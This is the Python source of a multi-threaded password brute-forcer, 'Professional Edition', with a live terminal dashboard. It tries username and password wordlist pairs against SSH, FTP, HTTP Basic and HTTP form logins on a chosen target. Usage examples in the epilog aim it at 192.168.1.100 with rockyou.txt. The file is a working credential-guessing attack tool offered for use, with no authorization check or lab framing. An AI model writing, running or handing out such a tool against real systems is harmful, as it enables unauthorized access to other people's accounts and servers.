#!/usr/bin/env python3
"""
Multi-threaded Brute Forcer - Professional Edition
Usage: python3 thread.py <target> <port> <protocol>
"""

import argparse
import queue
import threading
import sys
import time
from datetime import datetime

import socket
import paramiko
import ftplib
import http.client
import requests

from rich.console import Console
from rich.table import Table
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
from rich.text import Text
from rich import box
from rich.align import Align

# ------------------- UI Layer (cleanly separated) -------------------

class UIManager:
    """Handles all visual output — banners, status messages, live dashboard."""

    BANNER = """
    ╔══════════════════════════════════════════════════════╗
    ║                                                      ║
    ║     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗      ║
    ║     ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝      ║
    ║     ██████╔╝██████╔╝██║   ██║   ██║   █████╗        ║
    ║     ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝        ║
    ║     ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗      ║
    ║     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝      ║
    ║                                                      ║
    ║          Multi-Threaded Brute Force Engine            ║
    ║               Professional Edition                    ║
    ║                                                      ║
    ╚══════════════════════════════════════════════════════╝
    """

    STATUS_STYLES = {
        'success': '[+]',
        'info':    '[-]',
        'error':   '[!]',
        'warn':    '[?]',
        'found':   '[!!!]',
    }

    def __init__(self):
        self.console = Console()
        self.start_time = None
        self.total_combos = 0
        self.attempts = 0
        self.found = False
        self.found_cred = ""
        self.target = ""
        self.port = 0
        self.protocol = ""
        self.threads = 0
        self.current_user = ""
        self.current_pass = ""

    def print_banner(self):
        """Display the startup banner."""
        self.console.print(self.BANNER, style="cyan", justify="left")
        self.console.print("─" * 60, style="dim")

    def status(self, message: str, level: str = 'info'):
        """Print a color-coded status line."""
        style_map = {
            'success': 'green',
            'info':    'blue',
            'error':   'red',
            'warn':    'yellow',
            'found':   'bold bright_green',
        }
        prefix = self.STATUS_STYLES.get(level, '[*]')
        color = style_map.get(level, 'white')
        self.console.print(f"  {prefix} {message}", style=color)

    def build_dashboard(self) -> Table:
        """Build a live-updating stats table."""
        elapsed = time.time() - self.start_time if self.start_time else 0
        rate = self.attempts / elapsed if elapsed > 0 else 0
        pct = (self.attempts / self.total_combos * 100) if self.total_combos > 0 else 0

        table = Table(
            title="[bold cyan]BRUTE FORCE DASHBOARD[/]",
            box=box.HEAVY_EDGE,
            title_justify="center",
            border_style="cyan",
            padding=(0, 2),
        )

        table.add_column("Metric", style="bold yellow", width=20)
        table.add_column("Value", style="white", width=40)

        table.add_row("Target", f"{self.target}:{self.port}")
        table.add_row("Protocol", self.protocol.upper())
        table.add_row("Threads", str(self.threads))
        table.add_row("Total Combinations", f"{self.total_combos:,}")
        table.add_row("Attempts Made", f"{self.attempts:,}")
        table.add_row("Progress", f"{pct:.2f}%")
        table.add_row("Rate", f"{rate:.1f} attempts/sec")
        table.add_row("Elapsed", f"{elapsed:.1f}s")
        table.add_row("Currently Testing", f"{self.current_user}:{self.current_pass}")

        if self.found:
            status_text = Text(f"✓ CREDENTIALS FOUND: {self.found_cred}", style="bold green")
        else:
            status_text = Text("Searching...", style="bold yellow")

        grid = Table.grid(expand=True)
        grid.add_column()
        grid.add_row(Align.left(table))
        grid.add_row(Align.left(Panel(status_text, border_style="green" if self.found else "yellow")))

        return grid

    def print_summary(self):
        """Print final summary after completion."""
        elapsed = time.time() - self.start_time if self.start_time else 0
        rate = self.attempts / elapsed if elapsed > 0 else 0

        self.console.print()
        self.console.print("═" * 60, style="dim")
        self.console.print(("[bold]ATTACK COMPLETE[/]"))
        self.console.print("═" * 60, style="dim")

        summary = Table(box=box.ROUNDED, border_style="cyan")
        summary.add_column("Metric", style="bold yellow")
        summary.add_column("Value")
        summary.add_row("Total Attempts", f"{self.attempts:,}")
        summary.add_row("Time Elapsed", f"{elapsed:.2f}s")
        summary.add_row("Average Rate", f"{rate:.1f} attempts/sec")
        summary.add_row("Credentials Found", self.found_cred if self.found else "[red]None[/]")

        self.console.print(summary)
        self.console.print()


# ------------------- Core Logic (unchanged processing) -------------------

class BruteForcer:
    def __init__(self, target, port, protocol, usernames, passwords, threads=10, delay=0):
        self.target = target
        self.port = port
        self.protocol = protocol.lower()
        self.threads = threads
        self.delay = delay
        self.queue = queue.Queue()
        self.lock = threading.Lock()
        self.found = False
        self.found_cred = ""
        self.attempts = 0
        self.start_time = None

        # Load wordlists
        self.usernames = self._load_list(usernames)
        self.passwords = self._load_list(passwords)

        # Build credential pairs
        for user in self.usernames:
            for pwd in self.passwords:
                self.queue.put((user.strip(), pwd.strip()))

        # UI Manager
        self.ui = UIManager()
        self.current_user = ""
        self.current_pass = ""

    def _load_list(self, path):
        with open(path, 'r', errors='ignore') as f:
            return [line.rstrip('\n\r') for line in f if line.strip()]

    def _attempt_login(self, username, password):
        """Route to the correct protocol handler"""
        if self.protocol == 'ssh':
            return self._try_ssh(username, password)
        elif self.protocol == 'ftp':
            return self._try_ftp(username, password)
        elif self.protocol == 'http_basic':
            return self._try_http_basic(username, password)
        elif self.protocol == 'http_form':
            return self._try_http_form(username, password)
        else:
            raise ValueError(f"Unsupported protocol: {self.protocol}")

    def _try_ssh(self, username, password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(self.target, port=self.port, username=username,
                          password=password, timeout=5, banner_timeout=5)
            client.close()
            return True
        except (paramiko.AuthenticationException, EOFError):
            return False
        except Exception:
            return False

    def _try_ftp(self, username, password):
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.port, timeout=5)
            ftp.login(username, password)
            ftp.quit()
            return True
        except ftplib.error_perm:
            return False
        except Exception:
            return False

    def _try_http_basic(self, username, password):
        try:
            from requests.auth import HTTPBasicAuth
            url = f"http://{self.target}:{self.port}/"
            r = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=5)
            return r.status_code == 200
        except:
            return False

    def _try_http_form(self, username, password):
        try:
            url = f"http://{self.target}:{self.port}/login"
            data = {'username': username, 'password': password}
            r = requests.post(url, data=data, timeout=5, allow_redirects=False)
            return 'Login failed' not in r.text and r.status_code != 401
        except:
            return False

    def _worker(self):
        """Worker thread - pulls credentials from queue and tests them"""
        while not self.queue.empty() and not self.found:
            try:
                username, password = self.queue.get_nowait()
            except queue.Empty:
                break

            self.current_user = username
            self.current_pass = password

            with self.lock:
                self.attempts += 1
                current = self.attempts

            if self.delay:
                time.sleep(self.delay)

            success = self._attempt_login(username, password)

            if success:
                with self.lock:
                    self.found = True
                    self.found_cred = f"{username}:{password}"
                    self.ui.found = True
                    self.ui.found_cred = self.found_cred
                    self.ui.current_user = username
                    self.ui.current_pass = password
                return

            self.queue.task_done()

    def run(self):
        """Start the brute force attack"""
        self.start_time = time.time()

        # Configure UI state
        self.ui.start_time = self.start_time
        self.ui.total_combos = self.queue.qsize()
        self.ui.target = self.target
        self.ui.port = self.port
        self.ui.protocol = self.protocol
        self.ui.threads = self.threads

        # Show banner
        self.ui.console.clear()
        self.ui.print_banner()
        self.ui.status(f"Target: {self.target}:{self.port} ({self.protocol.upper()})", 'info')
        self.ui.status(f"Threads: {self.threads}", 'info')
        self.ui.status(f"Total combinations: {self.queue.qsize():,}", 'info')
        self.ui.status(f"Started at: {datetime.now().strftime('%H:%M:%S')}", 'info')
        self.ui.console.print()

        # Spawn worker threads
        workers = []
        for _ in range(min(self.threads, self.queue.qsize())):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
            workers.append(t)

        # Live dashboard
        try:
            with Live(self.ui.build_dashboard(), refresh_per_second=10, screen=False) as live:
                while any(t.is_alive() for t in workers):
                    # Update UI state from core state
                    self.ui.attempts = self.attempts
                    self.ui.current_user = self.current_user
                    self.ui.current_pass = self.current_pass
                    self.ui.found = self.found

                    live.update(self.ui.build_dashboard())
                    time.sleep(0.1)

                    if self.found:
                        # Wait for remaining threads to see flag
                        time.sleep(0.5)
                        break

        except KeyboardInterrupt:
            self.ui.status("Interrupted by user", 'warn')

        # Final update
        self.ui.attempts = self.attempts
        self.ui.found = self.found
        self.ui.found_cred = self.found_cred

        self.ui.print_summary()
        return self.found


# ------------------- Main -------------------

def main():
    parser = argparse.ArgumentParser(
        description='Multi-threaded Brute Forcer',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 thread.py 192.168.1.100 -p 22 --protocol ssh -U users.txt -P rockyou.txt -t 20
  python3 thread.py 192.168.1.100 -p 21 --protocol ftp -U users.txt -P passwords.txt -t 10
  python3 thread.py 192.168.1.100 -p 80 --protocol http_basic -U users.txt -P passwords.txt -t 5 --delay 0.5
        """
    )
    parser.add_argument('target', help='Target IP or hostname')
    parser.add_argument('-p', '--port', type=int, default=22, help='Target port (default: 22)')
    parser.add_argument('--protocol', choices=['ssh', 'ftp', 'http_basic', 'http_form'],
                       default='ssh', help='Protocol to attack (default: ssh)')
    parser.add_argument('-U', '--usernames', required=True, help='Username wordlist file')
    parser.add_argument('-P', '--passwords', required=True, help='Password wordlist file')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--delay', type=float, default=0,
                       help='Delay between attempts in seconds (default: 0)')

    args = parser.parse_args()

    bf = BruteForcer(
        target=args.target,
        port=args.port,
        protocol=args.protocol,
        usernames=args.usernames,
        passwords=args.passwords,
        threads=args.threads,
        delay=args.delay
    )

    bf.run()

if __name__ == '__main__':
    main()


